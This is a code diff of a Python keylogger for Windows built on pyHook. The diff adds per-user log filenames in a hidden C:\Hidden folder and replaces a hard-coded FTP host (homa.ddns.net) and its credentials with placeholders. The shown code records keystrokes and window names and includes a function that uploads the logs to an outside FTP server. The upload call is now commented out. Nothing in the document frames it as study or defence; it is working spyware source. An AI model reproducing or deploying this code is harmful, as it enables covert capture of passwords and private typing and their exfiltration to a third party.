@@ -1,22 +1,24 @@
-import pyHook, pythoncom, os
+import pyHook, pythoncom, os, getpass
 from ftplib import FTP  # for uploading the file to an FTP server
 from datetime import datetime
+
+currentuser = getpass.getuser()  # Get the username of the currently logged in user
 
 newpath = r'C:\Hidden'
 if not os.path.exists(newpath):
     os.makedirs(newpath)
 
 todays_date = datetime.now().strftime('%Y-%b-%d')
-file_name = 'C:\\Hidden\Logger' + todays_date + '.txt'
+file_name = 'C:\\Hidden\\' + currentuser + '_' + todays_date + '.txt'
 
 currentline = ""  # This is used to store a buffer of keypresses
 windowname = ""  # Used to store the name of the window being typed in
 
 
 def uploadftp():
-    ftpserver = FTP('homa.ddns.net')
-    ftpserver.login('FTPUser', 'FTPpass1')
-    ftpserver.storbinary("STOR Logger" + todays_date + ".txt", open(file_name, 'r'))
+    ftpserver = FTP('FTP Server address')  # Add an FTP server address here
+    ftpserver.login('FTP Username', 'FTP password') # Add the logon details for the FTP server here
+    ftpserver.storbinary("STOR "+ currentuser + '_' + todays_date + ".txt", open(file_name, 'r'))
     ftpserver.close()
     return
 
@@ -25,7 +27,8 @@ def saveline(line):
     newfile = open(file_name, 'a+')
     newfile.write(line)
     newfile.close()
-
+    """ Uncomment the below to include the FTP upload function, FTP server details should be added above """
+    #uploadftp()
 
 def OnKeyboardEvent(event):
     global currentline, windowname
